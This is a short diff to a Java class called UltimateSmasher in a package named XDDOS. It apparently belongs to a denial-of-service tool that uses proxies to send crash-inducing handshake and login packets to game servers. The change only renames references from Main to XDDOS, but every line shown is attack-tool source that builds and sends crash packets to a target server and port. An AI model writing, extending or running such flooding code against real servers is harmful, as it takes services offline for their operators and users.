@@ -1,6 +1,6 @@
 package XD.XDDOS.methods;
 
-import XD.XDDOS.Main;
+import XD.XDDOS.XDDOS;
 import XD.XDDOS.NettyBootstrap;
 import XD.XDDOS.ProxyLoader;
 import XD.XDDOS.utils.Handshake;
@@ -26,7 +26,7 @@ public class UltimateSmasher
   private byte[] joinpacket = (new LoginRequest(YooniksCry.name)).getWrappedPacketC();
   
   public UltimateSmasher() {
-    this.handshake = new Handshake(Main.protcolID, Main.srvRecord, Main.port, 2);
+    this.handshake = new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2);
     this.bytes = this.handshake.getWrappedPacket();
   }
   
@@ -49,7 +49,7 @@ public class UltimateSmasher
     ByteBuf b = Unpooled.buffer();
     ByteBufOutputStream bbbb = new ByteBufOutputStream(b);
     try {
-      writePacket(PacketUtils.createHandshakePacketCrash(Main.srvRecord, Main.port, 47), bbbb);
+      writePacket(PacketUtils.createHandshakePacketCrash(XDDOS.srvRecord, XDDOS.port, 47), bbbb);
       channel.write(Unpooled.buffer().writeBytes(this.joinpacket));
       bbbb.write(47);
       bbbb.write(80);
